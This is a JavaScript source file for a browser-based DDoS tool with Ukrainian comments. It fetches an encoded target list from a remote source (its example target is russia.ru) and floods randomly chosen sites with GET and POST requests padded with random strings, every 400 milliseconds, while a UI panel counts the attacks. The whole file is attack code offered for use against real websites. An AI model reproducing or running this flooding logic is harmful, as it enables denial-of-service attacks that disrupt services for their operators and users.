/*!
MIT License

Copyright (c) 2022-2023 Yuriy Bogdan
*/

// @ts-nocheck

const Tools = {
	charSet: "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890",

	getFlood(lenght) {
		let flood = "";

		for (let i = 0; i < lenght; i++) {
			flood += randomChoice(this.charSet)
		}
		return flood
	},
	/**
	 * Отримання цілей для атаки
	 * 
	 * Беруться цілі, для яких в нас є **потрібний метод** для атаки
	 * 
	 * @example 
	 * await Tools.getTargets()
	 * [
	 *   {
	 *     "page": "https://russia.ru",
	 *     "method": "get"
	 *   },
	 *   ...
	 * ]
	 * 
	 * @param {array} supportedMethods - Методи, якими ми можемо атакувати
	 * @returns {Promise<Target[]>} **Відфільтровані цілі** (вилучаються цілі, для яких треба _специфічні_ методи атаки)
	 */
	async getTargets(supportedMethods) {
		return await fetch(targetSource).then(async function (response) {
			if (response.ok) {
				const responseText = await response.text()

				/** @type {Target[]} */
				const encodedData = JSON.parse(atob(responseText))

				/** @type {Target[]} */
				let filteredTargets = []

				for (let target of encodedData) {
					supportedMethods.includes(target.method) && filteredTargets.push(target)
				}

				return filteredTargets;
			}
		},
		() => {}
		)
	}
}

class Sword {
	constructor() {
		this.defaultRequestParams = {
			cache: 'no-cache',
			referrerPolicy: 'no-referrer',
			mode: 'no-cors'
		}
	}

	async attack(target) {
		this[target.method](target)
	}


	async request(url, data) {
		await fetch(url, {
			...this.defaultRequestParams,
			...data
		})
	}

	async get(target) {
		const page = target.page

		if (!page.includes("?")) {
			page += "/" + Tools.getFlood(64)
		}

		await this.request(page, {
			method: "GET"
		})
	}

	async post(target) {
		await this.request(target.page, {
			method: "POST",
			body: Tools.getFlood(128)
		})
	}
}

class Doser {
	constructor() {
		this.attack = false
		this.attackInterval = 400
		this.supportedAttackMethods = ['post', 'get']
	}

	async run() {
		this.attack ? this.stop() : this.start()
	}

	async start() {
		if (!this.attack) {
			Panel.buttonText("Стоп")
			Sounds.click.play()
			this.attack = true

			const targets = await Tools.getTargets(this.supportedAttackMethods)

			if (!targets) {
				swal("Помилка", "Не вдалось завантажити цілі", "error")
				Panel.buttonText("Старт!")
				return;
			} // else

			// Атакоцикл, брум-брум! 😂
			this.attackCycle = setInterval(async () => {
				const randomTarget = randomChoice(targets)

				Panel.showCurrentTarget(randomTarget)

				await Sword.attack(randomTarget)
					.then(() => Panel.increaseAttacksCounter(),
						  () => Panel.increaseAttacksCounter())

			}, this.attackInterval)
		}
	}

	/** Зупинка атаки */
	stop() {
		clearInterval(this.attackCycle)
		this.attack = false
		Sounds.click.play()
		Panel.buttonText("Старт!")
	}
}